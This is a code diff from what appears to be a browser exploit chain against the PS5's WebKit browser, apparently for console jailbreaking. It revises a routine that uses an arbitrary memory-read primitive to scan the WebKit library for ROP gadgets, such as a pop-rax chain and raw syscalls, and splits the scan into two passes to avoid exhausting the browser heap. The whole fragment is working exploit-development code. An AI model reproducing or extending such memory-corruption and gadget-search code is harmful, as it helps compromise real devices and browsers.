@@ -224,24 +224,29 @@ async function prepare(p) {
     // `mov [rdi],rax`, the classic pop-rax chain works without libkernel.
     let rawSyscall = false;
     function scanWkPat(pat) {
-        const CHUNK = 0x4000, TOTAL = 0x2c7c000, OVER = 16;
-        // ONE reusable window: array_from_address() gives a view whose setAddr()
-        // re-points it. Calling it per chunk allocated ~5600 Uint8Arrays pinned
-        // in nogc -> WebKit heap exhaustion ("not enough free memory") right
-        // after the primitive settled.
-        let view;
+        // Pass 1: first 8 MB — fast, minimal memory pressure.
+        // Pass 2: 8-16 MB — only when pass 1 misses both gadgets.
+        // The old 0x2c7c000 (46.7 MB) scan ran BEFORE new Worker() and
+        // exhausted the PS5 browser heap -> "not enough free memory".
+        const CHUNK = 0x4000, OVER = 16;
+        const PASSES = [0x800000, 0x1000000]; // 8 MB then 16 MB
+        let view = null;
         try { view = array_from_address(libSceNKWebKitBase.add32(0), CHUNK + OVER); }
         catch (e) { return null; }
-        for (let off = 0; off < TOTAL; off += CHUNK) {
-            const window = Math.min(CHUNK + OVER, TOTAL - off);
-            const scanLen = Math.min(CHUNK, TOTAL - off);
-            try { view.setAddr(libSceNKWebKitBase.add32(off), window); }
-            catch (e) { continue; }
-            outer:
-            for (let i = 0; i + pat.length <= scanLen; i++) {
-                for (let j = 0; j < pat.length; j++)
-                    if ((view[i + j] & 0xff) !== pat[j]) continue outer;
-                return libSceNKWebKitBase.add32(off + i);
+        for (let pass = 0; pass < PASSES.length; pass++) {
+            const start = pass === 0 ? 0 : PASSES[pass - 1];
+            const end   = PASSES[pass];
+            for (let off = start; off < end; off += CHUNK) {
+                const chunkEnd = Math.min(CHUNK + OVER, end - off);
+                const scanLen  = Math.min(CHUNK, end - off);
+                try { view.setAddr(libSceNKWebKitBase.add32(off), chunkEnd); }
+                catch (e) { continue; }
+                outer:
+                for (let i = 0; i + pat.length <= scanLen; i++) {
+                    for (let j = 0; j < pat.length; j++)
+                        if ((view[i + j] & 0xff) !== pat[j]) continue outer;
+                    return libSceNKWebKitBase.add32(off + i);
+                }
             }
         }
         return null;
